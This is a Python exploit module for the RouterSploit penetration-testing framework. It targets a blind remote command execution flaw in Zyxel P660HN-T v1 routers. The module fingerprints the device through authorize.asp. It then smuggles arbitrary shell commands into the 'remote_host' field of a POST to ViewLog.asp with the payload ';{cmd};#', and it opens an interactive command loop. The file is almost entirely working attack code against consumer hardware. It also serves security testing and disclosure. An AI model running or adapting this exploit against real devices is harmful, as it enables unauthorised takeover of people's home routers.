from routersploit import (
    exploits,
    print_error,
    print_status,
    print_success,
    http_request,
    mute,
    validators,
    shell,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Zyxel P660HN-T v1 Remote Command Execution vulnerability.
    If the target is vulnerable it allows to execute commands on operating system level.
    """
    __info__ = {
        'name': 'Zyxel P660HN-T v1 RCE',
        'description': 'Module exploits Remote Command Execution vulnerability in Zyxel P660HN-T v1 devices.'
                       'If the target is vulnerable it allows to execute commands on operating system level.',
        'authors': [
            'Pedro Ribeiro <pedrib[at]gmail.com>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://seclists.org/fulldisclosure/2017/Jan/40',
            'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/zyxel_trueonline.txt',
            'https://blogs.securiteam.com/index.php/archives/2910'
        ],
        'devices': [
            'Zyxel P660HN-T v1',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target port', validators=validators.integer)

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable")
            print_status("Invoking command loop...")
            print_status("It is blind command injection - response is not available")
            shell(self, architecture="mipsbe")
        else:
            print_error("Target seems to be not vulnerable")

    def execute(self, cmd):
        url = "{}:{}/cgi-bin/ViewLog.asp".format(self.target, self.port)

        payload = ";{};#".format(cmd)
        data = {"remote_submit_Flag": "1",
                "remote_syslog_Flag": "1",
                "RemoteSyslogSupported": "1",
                "LogFlag": "0",
                "remote_host": payload,
                "remoteSubmit": "Save"}

        http_request(method="POST", url=url, data=data)

        return ""

    @mute
    def check(self):
        url = "{}:{}/cgi-bin/authorize.asp".format(self.target, self.port)
        response = http_request(method="GET", url=url)
        if response is None:
            return False

        if "ZyXEL P-660HN-T1A" in response.text:
            return True

        return False
